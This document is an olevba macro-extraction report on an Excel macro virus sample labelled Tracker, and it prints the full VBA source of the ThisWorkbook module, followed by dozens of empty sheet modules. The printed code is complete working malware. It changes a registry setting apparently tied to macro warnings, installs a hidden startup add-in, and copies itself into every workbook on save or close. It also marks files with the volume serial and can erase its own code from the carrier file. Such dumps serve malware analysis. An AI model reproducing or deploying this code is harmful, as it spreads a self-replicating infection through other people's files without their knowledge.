olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "BASE5874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1










Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Munka1.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka2.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka3.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka4.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka5.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka6.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka7.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka8.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka9.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka10.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka11.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka12.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka13.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka14.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka15.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka16.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka17.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka18.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka19.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka20.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka21.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka22.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka23.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka24.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka25.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka26.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka27.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka27'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka28.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka28'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka29.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka30.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka31.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka31'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka32.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka33.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka34.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka35.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka36.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka37.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka38.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka38'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka39.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka40.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka40'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka41.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka41'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka42.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka42'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka43.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka44.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka44'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka45.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka45'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka46.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka46'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka47.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka47'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka48.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka48'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka49.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka49'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka50.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka50'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka51.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka51'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka52.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka52'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka53.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka53'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka54.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka54'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka55.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka56.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka56'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka57.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka57'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka58.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka58'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka59.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka59'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka60.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka60'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka61.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka61'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka62.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka62'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka63.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka63'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka64.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka64'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka65.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka65'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka66.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka66'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka67.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka67'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka68.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka69.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka69'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka70.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka70'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka71.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka71'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka72.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka72'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka73.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka73'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka74.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka74'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka75.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka75'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka76.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka76'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka77.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka77'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Munka78.cls 
in file: Virus.MSExcel.Tracker-based-3442bc1d193aa12f7c903c9cf192a98b4f01d440 - OLE stream: '_VBA_PROJECT_CUR/VBA/Munka78'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
